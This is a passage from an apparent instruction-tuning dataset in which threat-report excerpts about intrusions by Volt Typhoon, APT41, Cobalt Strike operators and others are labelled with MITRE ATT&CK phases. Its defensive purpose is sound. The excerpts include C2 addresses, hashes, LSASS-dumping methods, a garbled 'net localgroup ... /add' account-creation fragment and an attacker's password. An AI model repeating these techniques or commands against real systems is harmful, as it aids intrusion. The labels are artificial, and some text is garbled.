        "input": "Described attack activity: Volt Typhoon achieves initial access to targeted organizations through internetfacing Fortinet FortiGuard devices. Microsoft continues to investigate Volt Typhoon's methods for gaining access to these devices. \nThe threat actor attempts to leverage any privileges afforded by the Fortinet device, extracts credentials to an Active Directory account used by the device, and then attempts to authenticate to other devices on the network with those credentials. \nVolt Typhoon proxies all its network traffic to its targets through compromised SOHO network edge devices (including routers). Microsoft has confirmed that many of the devices, which include those manufactured by ASUS, Cisco, D-Link, NETGEAR, and Zyxel, allow the owner to expose HTTP or SSH management interfaces to the internet. Owners of network edge devices should ensure that management interfaces are not exposed to the public internet in order to reduce their attack surface. By proxying through these devices, Volt Typhoon enhances the stealth of their operations and lowers overhead costs for acquiring infrastructure. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware has an aggressive approach to persistence. It employs the following techniques: \nIt drops a copy of itself into the %APPDATA% folder, masquerading as a version of legitimate software installed on the victim machine. It creates an Autorun registry key and a shortcut in the Windows Startup folder. During our analysis, it dropped itself to the following path: \n%APPDATA%\\Google\\v2.1.13554\\ <RandomName>.exe. \nThe path can vary depending on the folders the malware finds in %APPDATA%. \nIt drops multiple copies of itself in subfolders of a program at the path %ProgramFiles%/%PROGRAMFILES(X86)%, again masquerading as a different version of the installed program, and sets an Autorun registry key or creates a scheduled task. \nA Deep Dive Into RIG Exploit Kit Delivering Grobios Trojan | Mandiant | Google Cloud Blog \nIt drops a copy itself in the %Temp% folder, and creates a scheduled task to run it. \nOn an infected system, the malware creates two scheduled tasks, as shown in Figure 8. \nThe malware changes the file Created, Modified, and Accessed times of all of its dropped copies to the Last Modified time of ntdll.dll. To bypass the \"File Downloaded from the Internet\" warning, the malware removes the :Zone.Identifier flag using DeleteFile API, as shown in Figure 9. \n0224FCC8 0040571ErCALL to DeleteFileW from file.0040571D   \n0224ECCC 002C1174 LrileName = \"C:\\Program Files (x86)\\01lyDbg2\\vl.5.4.5\\Test.exe:Zone.Identifier\" 00000000 \nAn interesting behavior of this malware is that it protects its copy in the %TEMP% folder using EFS (Windows Encrypted File System), as seen in Figure 10. ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two and a half days later, the attackers signed into one of the target devices they found during their initial discovery efforts using compromised credentials via interactive sign-in. They opted for a credential theft technique that didn't require dropping a file like Mimikatz that antivirus products might detect. Instead, they opened Taskmgr.exe, created a dump file of the LSASS.exe process, and saved the file to a ZIP archive. \nThe attackers continued their previous discovery efforts using a PowerShell script version of ADRecon (ADRecon.ps1), which is a tool designed to gather extensive information about an Active Directory (AD) environment. The attacker followed up this action with a net scanning tool that opened connections to devices in the organization on server message block (SMB) and remote desktop protocol (RDP). For discovered devices, the attackers attempted to navigate to various network shares and used the Remote Desktop client (mstsc.exe) to sign into these devices, once again using the compromised account credentials. \nThese behaviors continued for days, with the attackers signing into numerous devices throughout the organization, dumping credentials, and determining what devices they could access. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor then used a modified version of VeeamHax (https://github.com/sfewer-r7/CVE-2023-27532). This tool exploited CVE-2023-27532. Below is a side by side of the decompiled version we observed and the source. The main changes were to allow arbitrary SQL commands to be supplied as an argument evaluated on the Veeam target.\nThe cmd argument gets executed through a hard coded xp_cmdshell command. As seen below, the threat actor stuck to using the default value in the original version of the VeeamHax exploit  c:\\windows\\notepad.exe.\nThis ended up being executed on the target SQL server but did not serve any purpose to their goals. The notepad process was used for Proof of Concept purposes. In this execution context, Notepad.exe is considered a harmless process that does not lead to any malicious activity. The sql argument was the custom addition to the script that would allow arbitrary SQL commands to be passed to the exploit.\nThe threat actor ran the following commands using their custom version of VeeamHax.exe to enable xp_cmdshell before creating a local administrator named sqlbackup with the password of Password!1221!.\nThe VeeamHax.exe binary included the developers Program Database (PDB) string as:\nFrom the backup server we observed the net commands executed by the MSSQL process.\nThe Security event log recorded the local account creation in Event ID 4720:\nSQL Server associated Windows Application Event IDs for xp_cmdshell enable, followed by cmd execution are indicated by two event IDs 15457 in quick succession:\nFirst event relates to enabling xp_cmdshell:\nFollowed by the xp_cmdshell execution:\nPayload Failures\nWhile the VeeamHax.exe process executed successfully, the process was observed terminating in the Windows Application Event Log under Event ID 1000 (Provider: Application Error). This indicates that the exploit didn't safely handle exception errors, resulting in an application crash.\nWith an associated '.Net Runtime' error:\nThe attacker was observed executing the process on several occasions, each time several application error events were observed. Resulting in associated Windows Error Reporting Event ID 1001 (Provider: Windows Error Reporting) being generated.\nA WerFault process invoked by an application indicates that the application terminated unexpectedly. There were multiple exploit attempts by the threat actor in a short time frame.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The DNS rebinding attack can compromise victims' browsers as traffic tunnels to exploit private services. With this technique, attackers can steal confidential information and send forged requests to victims' servers. Browsers, resolvers and web applications have applied various protection strategies to defend against it. However, there are advanced exploits that can bypass traditional defenses. In addition, it's harder to enforce complete protection as the internal network environment becomes more complex.\nAt Palo Alto Networks, we have launched a DNS rebinding detection system to protect our customers. It can effectively identify various implementations of DNS rebinding that leverage multiple types of DNS records and present different resolution behaviors. The system's filtering module can identify legitimate usage of internal IP resolution to prevent false blocking. After capturing potential penetration activities, our system will release the attacking hostname with the command and control category toPalo Alto Networks Next-Generation Firewallsecurity subscriptions in real time.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Evidence from the intrusion shows that the Cobalt Strike pass-the-hash module was leveraged, resulting in a new cmd.exe process being spawned by dllhost.exe, which indicates a successful attempt to elevate privileges to the local 'SYSTEM.'\nSubsequently, the dllhost.exe process initiated a request for access to the LSASS process with the specific permissions mask of 0x1FFFFF (PROCESS_ALL_ACCESS). This access request pattern indicated an attempt to perform credential dumping from the LSASS process memory space.\nIndicative of this behavior is the 0x1FFFFF Granted access (full process access) and the UNKNOWN in the CallTrace:\nCallStackTrace showing multiple offsets including 'UNKNOWN'\nAdditional evidence of this activity included the use of Logon type 9 alongside an authentication type of seclogo strongly indicates credential use, akin to the runas command's /netonly method, as used by Cobalt Strike's 'pass the hash' technique. (CobaltstrikeWindows Access Tokens and Alternate Credentials | Cobalt StrikeWindows Access Tokens and Alternate Credentials | Cobalt Strikecobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials\n).\nRubeus\nDuring the intrusion the threat actor appeared to have tried to use Rubeus for credential access, based on YARA hits for the tool in the memory captures from the beachhead. It was discovered within the process memory space of the Brute Ratel Badger. The tool can perform a variety of credential access techniques and we were unable to identify any specific invocations indicating the methods attempted during this intrusion.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1084 Windows Management Instrumentation Event Subscription | WMI event subscription T1136 Create Account | Creation of new accounts for RDP \nCommand and control \nT1043 Commonly Used Port | Use of port 443 ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cosmu has a couple of different mechanisms for achieving persistence on the system. It creates a scheduled task and installs a Windows service. \nThe scheduled task is typically named \"Watchmon Service\". It executes the malware at system startup. \nThe service typically has name javamtsup, and the display name is \"Java(TM) Virtual Machine Support Service\". The size of the service binary on disk varies, but typically the real size is 5120 bytes (based on PE headers) and the SHA1 value is 7803f160af428bcfb4b9ea2aba07886f232cde4e. \nThe service itself is very straightforward: it opens a handle to explorer.exe process, duplicates its process token, reads the path of the actual malware binary from registry (key HKLM\\Software\\JavaSoft, value Supplement) and starts the malware using the duplicated process token. \nCosmu copies itself with a couple of different filenames to %WINDIR%\\system32. The binaries on the disk have a variable length of zero-padding but they are all essentially copies of the original malware binary. \nThe filenames for both the Cosmu copies and the service binary are generated by randomly taking two items from the following list and concatenating them, resulting in filenames like usbmon.exe, urllsa.exe, and rasdns.exe: \nyy nt yy fw yy env y inf yy pc yy lib yy svc yy ctf yy ud y ras yy mon yy wm y pptp yy pdb yy win y obj yy ms yy id yy net y cpl yy wdm yy host yy sys y mgr yy lsa yy ui   \ny cms yy schd   \ny dsp yy tapi   \ny sql yy eng   \nyy dhcp yy cfg   \nyy srv yy api   \nyy dns yy fs   \nyy ip yy url ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial command and control was a Cobalt Strike beacon to compdatasystems.com triggered by the execution of setup_wm.exe.\nAs part of the command and control (C2) phase, the threat actor established a connection to a second Cobalt Strike C2 server using the IP address 159.100.14.254 over port 443. The domain associated with this server was retailadvertisingservices[.]com.\nDuring this activity, process injection was observed, with the threat actor targeting legitimate processes such as svchost.exe. The injection activity allowed them to run malicious code within trusted system processes.\nCommunication with these command and control servers continued over the length of the intrusion.\nThe configuration of the setup_wm.exe beacon is below:\nUsing dynamic analysis, we were able to determine several of the dropped files as SystemBC.\nCommunication to the SystemBC command and control server started on the first day and lasted over the length of the intrusion.\nAnalysis revealed that the other deployed proxy was GhostSOCKS, a Malware-as-a-Service (MaaS) tool.\nThese binaries were deployed on the beachhead host as well as a file share server and a backup server. Upon execution these binaries reached out to the following command and control servers:\nTraffic to the GhostSocks server was only observed on the first day.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Hacktivity 2022 security festival was held at the MOM Cultural Center in Budapest, Hungary, over two days, October $6{-}7^{\\mathrm{th}}$ 2022. One of several presentations by our GReAT researchers included an interesting set of APT activity targeting online casino development and operations environments in Southeast Asia. A recorded video of the presentation is already online. You can watch it here: \nAll of our research, including a full set of IoCs and Yara rules, is written up in the two-part report \"DiceyF Deploys GamePlayerFramework in Online Casino Development Studio\", already available to our private report subscribers. Some technical analysis from the report is provided here, along with a reference set of IoCs. You can find more information about trial and pay report subscription options at intelreports@kaspersky.com. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting. A common tactic seen is the deployment of a ConfuserEx obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation. Once APT41 escalated to NT AUTHORITY\\SYSTEM privileges, they copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting and exfiltration. APT41 has additionally used Mimikatz to execute the lsadump::sam command on the dumped registry \nhives to obtain locally stored credentials and NTLM hashes. \nAPT41 also conducted Active Directory   \nreconnaissance by uploading the Windows   \ncommand-line tool dsquery.exe (MD5:   \n49f1daea8a115dd6fce51a1328d863cf) and its   \nassociated module dsquery.dll (MD5:   \nb108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the   \nenvironment. \nDuring the early stage of one U.S. state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN. DUSTPAN is an in-memory dropper written in $\\mathsf{C}\\substack{++}$ that leverages ChaCha20 to decrypt embedded payloads. Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary. DUSTPAN is consistent with the publicly named StealthVector, reported by Trend Micro in August 2021. During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A day after initial access, Bazar initiated some discovery activity using Nltest:\nOn the forth day, a Cobalt Strike Beacon was executed and then the following discovery commands were executed.\nOn the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:\nAfter beginning lateral movement, the threat actors used the following Window's utilities for system profiling:\nOnce the threat actors had access to a domain controller, they ran the following PowerShell discovery:\nAfter running that, the threat actors used nltest again to confirm domain trusts:\nThe local time was also queried on the domain controller:\nAdFind was executed using adf.bat:\nThis script and files are available @https://thedfirreport.com/services/",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP and SMB/Windows Admin Shares top the list around 41% each.\nIt is not surprising that attackers prefer the interactive graphics interface RDP provides. Such access allows them to search for sensitive documents or any other information without setting off any alerts. We can see from the cases, particularly those involving Cobalt Strike, that threat actors use a reverse proxy to tunnel their connections through the C2 server. More information about thistechniquecan be found in our second report on Cobalt Strike, \"Cobalt Strike, a Defender's Guide  Part 2\".\nWhen a connection is established, eventID 4624 LogonType 10of the security event log can provide us with the name of the remote host that initiated the connection.\nThis same data can show up in other logs like Event ID 4778 under Security as observed fromQuantum Ransomware.\nThreat actors then use the beachhead host to RDP to other hosts in the environment, assuming they have obtained the necessary access.\nSMB access remains one of the most reliable methods to achieve execution on the remote host. We have seen a combination of ways malicious operators copy a tool over to the remote host and then use Cobalt Strike to run it. The tools they transfer to the remote hosts range from remote administration tools, such as Atera agent, to Cobalt Strike beacons and ransomware payloads.\nAn example of a recent case where an executable was transferred over SMB is the case \"Emotet Strikes Again  LNK File Leads to Domain Wide Ransomware\".\nWe saw the threat actors create and run a beacon DLL on the target host. The execution was via Cobalt Strike and was initiated by the beachhead host.\nAccording to our data, other methods such as Windows Remote Management, pass-the-hash and remote service creation were used, but less frequently compared to the previous techniques.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.\nOn the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host's Windows domain.\nThe threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.\nAdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script. The contents of the script are below:\nUsing the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.The batch file contained one line, which pinged a list of servers (servers.txt).The line can be seen below:\nAdditionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Direct access to production cryptocurrency infrastructure from developer workstations is especially risky. Mandiant has observed threat actors leveraging footholds on developer systems to interact with such infrastructure: \nTargeted phishing via fake job opportunities: State-sponsored threat actors leveraged fake job postings on \nLinkedIn to deliver malware to developers and their highly privileged systems, leading to privileged access to cryptocurrency infrastructure. \nAWS CLI abuse: Attackers have used the AWS CLI to interact with and extract secrets from wallet infrastructure hosted in Elastic Kubernetes Service (EKS). \nAPI key compromise: In some cases, attackers leveraged their foothold to make API requests to the cryptocurrency custodian platform using keys stored within scripts and API testing applications. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors leveraged many built-in Windows tools for discovery including the following:\nThe arp command was run using PowerShell Remoting.They also reviewed a few admin tools while exploring the network including:\nThe threat actors also brought some tools of their own to aid in discovery tasks includingAdvanced Port ScannerandADRecon. Here's the description of ADRecon.Other local discovery was performed using PowerShell such as ps to list the running process on systems.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The overall proliferation of cryptocurrency-focused malware has been gaining momentum the last few years. The threat actor in this particular instance has implemented the following activities in their campaigns:\nIncorporating malvertising \nUsing TDS \nLimiting the scope of targeting \nKeying the payloads to the environment \nEmploying more complex and stealthier techniques to hide the overall functionality of the loader and clipper \nCreating custom algorithms for data manipulation\nThese practices highlight an interesting shift, especially in cryptocurrency-targeting malware. We often see two particular methods for the distribution of such threats. They may be pushed using a botnet like withLaplas Clipper and Smokeloader, or there may be an underlying malware-as-a-service (MaaS) element such as withEternity Clipper.\nProtections and Mitigations\nPalo Alto Networks customers usingCortex XDRreceive protections at the endpoints from the malware techniques described in this blog. Palo Alto Networks Next-Generation Firewalls withAdvanced URL FilteringandDNS Securityidentify domains associated with the CryptoClippy campaign as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1033 System Owner/User Discovery | Various commands T1087 Account Discovery | LDAP and AD queries and other commands T1018 Remote System Discovery | Pings, qwinsta, and other tools and commands T1482 Domain Trust Discovery | Domain trust enumeration using Nltest ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0537 uses a variety of methods that are typically focused on compromising user identities to gain initial access to an organization including: \nDeploying the malicious Redline password stealer to obtain passwords and session tokens   \nPurchasing credentials and session tokens from criminal underground forums   \nPaying employees at targeted organizations (or suppliers/business partners) for access to credentials and MFA approval   \nSearching public code repositories for exposed credentials \nUsing the compromised credentials and/or session tokens, DEV-0537 accesses internet-facing systems and applications. These systems most commonly include virtual private network (VPN), remote desktop protocol (RDP), virtual desktop infrastructure (VDI) including Citrix, or identity providers (including Azure Active Directory, Okta). For organizations using MFA security, DEV-0537 used two main techniques to satisfy MFA requirementssession token replay and using stolen passwords to trigger simple-approval MFA prompts hoping that the legitimate user of the compromised account eventually consents to the prompts and grants the necessary approval. \nIn some cases, DEV-0537 first targeted and compromised an individual's personal or private (non-work-related) accounts giving them access to then look for additional credentials that could be used to gain access to corporate systems. Given that employees typically use these personal accounts or mobile phone numbers as their second-factor authentication or password recovery, the group would often use this access to reset passwords and complete account recovery actions. \nMicrosoft also found instances where the group successfully gained access to target organizations through recruited employees (or employees of their suppliers or business partners). DEV-0537 advertised that they wanted to buy credentials for their targets to entice employees or contractors to take part in its operation. For a fee, the willing accomplice must provide their credentials and approve the MFA prompt or have the user install AnyDesk or other remote management software on a corporate workstation allowing the actor to take control of an authenticated system. Such a tactic was just one of the ways DEV-0537 took advantage of the security access and business relationships their target organizations have with their service providers and supply chains. \nIn other observed activity, DEV-0537 actors performed a SIM-swapping attack to access a user's phone number before signing into the corporate network. This method allows the actors to handle phone-based authentication prompts they need to gain access to a target. \nOnce standard user credentials or access was obtained, DEV-0537 typically connected a system to an organization's VPN. In some cases, to meet conditional access requirements, DEV-0537 registered or joined the system to the organization's Azure Active Directory (Azure AD). ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attestation signing process offloads the responsibility of verifying the identity of the requesting hardware or software vendor to the Certificate Authorities.  In theory this is a valid process as the CAs must follow agreed upon procedures to verify the identity of the requesting entity and the authority of the individual making the request to represent the software vendor. However, this process is being abused to obtain malware signed by Microsoft. \nThis is not a new occurrence; both GData and BitDefender released reports on Microsoft signed malicious drivers in 2021. \"Microsoft signed a malicious Netfilter rootkit\" and \"Digitally-Signed Rootkits are Back \u2013 A Look at FiveSys and Companions\" discussed malicious drivers signed via the same attestation process discussed in this blog post. \nWhile this blog post has focused on POORTRY and the attestation signing process, Mandiant has observed other malware being signed via attestation. TEMPLESHOT is a malware family consisting of dropper, backdoor, a filter driver, and a protection driver. The TEMPLESHOT driver with MD5  48bf11dd6c22e241b745d3bb1d562ca1  has been observed in the wild and is signed via attestation. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Judging from what we've seen so far, it seems like the author of DarkGate leveraged sophisticated techniques to avoid detection both by endpoint and network security products. \nThe malware contains six hard-coded domains, shown below, which it attempts to communicate with upon infection. It looks like the domains are chosen carefully to disguise the C&C server as a known legitimate service, such as Akamai CDN or AWS, and avoids looking suspicious to anyone who may be monitoring the network traffic. \nakamai.la   \nhardwarenet.cc ec2-14-122-45-127.compute-1.amazonaws.cdnprivate.tel awsamazon.cc battlenet.la a40-77-229-13.deploy.static.akamaitechnologies.pw \nAdditionally, it seems the author has employed another trick by using NS records that look like legitimate rDNS records from Akamai or Amazon. The idea behind using rDNS is that they're overlooked and easily dismissed by anyone monitoring network traffic. ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bazar:\n5.182.210.145|443\nCertificate [ec:4c:07:b8:3b:6a:a0:bf:60:36:b7:f4:92:9e:83:81:0f:96:46:b0]\nNot Before2020/09/21 05:24:24 UTC\nNot After2021/09/21 05:24:24 UTC\nIssuer OrgGlobal Security\nSubject Commonexample.com\nSubject OrgGlobal Security\nPublic AlgorithmrsaEncryption\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: e35df3e00ca4ef31d42b34bebaa2f86e\nCobalt strike:\n88.119.171.75|443\nCertificate [ee:92:91:6b:7e:31:85:22:65:eb:16:11:c4:8f:0a:75:c9:05:1d:4b]\nNot Before2020/09/29 08:18:03 UTC\nNot After2021/09/29 08:18:03 UTC\nIssuer Orglol\nSubject Commonmartahzz.com\nSubject Orglol\nPublic AlgorithmrsaEncryption\nJA3 : a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\n107.173.58.183|443\nCertificate [e2:13:2c:a4:29:ae:f3:fa:35:1f:e1:5b:2c:25:76:57:37:5b:dc:35]\nNot Before2020/09/22 14:34:11 UTC\nNot After2021/09/22 14:34:11 UTC\nIssuer Orglol\nSubject Commonnomadfunclub.com\nSubject Orglol\nPublic AlgorithmrsaEncryption\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.\nAfter this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.\nFollowing this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment usingPsExec.\nFrom here, RDP connections were established from the beachhead host to systems throughout the environment. The connections were proxied through the IcedID process.\nThe threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process. The below traffic shows more details of the RDP session, including the username in the cookie.\nThis proxied traffic reported back the hostname of the threat actors machine as \"mikespc\". We're looking for you Mike! \ud83d\ude09",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On misconfigured servers where they have gained the highest privileges, attackers were able to add a new user account on the server. This gave the attackers the ability to access the server without the need to deploy any remote access tools. \nThe attackers then added the newly created account to high-privilege groups like Administrators, Remote Desktop Users, and Enterprise Admins, practically making the attackers a domain admin with unrestricted access to any users or group in the organization. \n/add& net localgroup'Remote Desktop Users'defaults/add &net localgroup'Enterprise Admins\u2032defaults /add\" ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1583 Acquire Infrastructure T1583.001 Domains   \nC T1583.003 Virtual Private Server   \nT1583.008 Malvertising   \nT1584 Compromise Infrastructure   \nT1587 Develop Capabilities   \nT1587.002 Code Signing Certificates T1587.003 Digital Certificates   \nT1588 Obtain Capabilities T1588.001 Malware   \nO T1588.002 Tool T1588.005 Exploits   \nC T1588.004 Digital Certificates \nO T1608.002 Upload Tool C T1608.003 Install Digital Certificate C T1608.006 SEO Poisoning \nT1650 Acquire Access ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before making the payload persistent on the system, Seduploader may execute local privilege escalation exploits. Since Seduploader's first appearance, the two vulnerabilities described in Table 5 have been exploited, and both were unpatched when first used by the Sednit group. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process. The code was injected into multiple instances of svchost.exe.\nMemory analysis also shows suspicious memory protections (page_execute_readwrite) and regions of the particular process.\nFinally, when looking at the process tree, we can identify the unusual parent-child process relationship of rundll32.exe starting svchost.exe.\nThe svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances. One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.\nIn addition, the malicious 95.dll, which was observed during the lateral movement phase, is also designed to evade automated sandbox analysis. This DLL is crafted in such a way that it wouldn't show malicious behavior if an exported function is not called by passing a specific parameter. The DLL contains the Cobalt Strike shellcode and will only execute if the \"11985756\"parameter is passed to the TstSec function.\nAfter extracting the Cobalt Strike shellcode from 95.dll and emulating it viascdbg, we found that it's connecting to 162.244.83[.]95 over port 8080.\nSince 95.dll was executed by rundll32.exe, and from the host logs, it is evident  that rundll32.exe connected to 162.244.83[.]95 over port 8080.\nPacket analysis to the IP address mentioned above, shows that it's downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.\nOnce downloaded, the stager allocates a new memory region inside the current rundll32.exe process and loads it into the memory and starts the C2 activity.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the first day of the intrusion, four hours after the Nitrogen execution, the threat actor started interacting with other systems such as a file server through a Cobalt Strike beacon which was injected into winlogon.exe.\nFour hours after initial access, the threat actor moved laterally to a server using Impacket's wmiexec and downloaded a ZIP file containing Python and a Cobalt Strike beacon (wo12.py and wo14.py ).\nPass the Hash\nDuring the intrusion we observed three instances of possible pass-the-hash activity in the logs. These involved instances where the threat actor appear to be moving from the SYSTEM context to a domain administrator account.\nSMB Admin Shares\nWhile some of the threat actor's payloads were downloaded from a remote resource they also at times transferred their tooling laterally using SMB, and then executed using WMIC or wmiexec.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Archive Collected Data: Archive via Utility  T1560.001 \nTo collect data, APT41 downloaded a portable archiver file to compromised devices. The group archived the necessary files and exfiltrated them to their intermediate server. ",
        "output": "collection",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
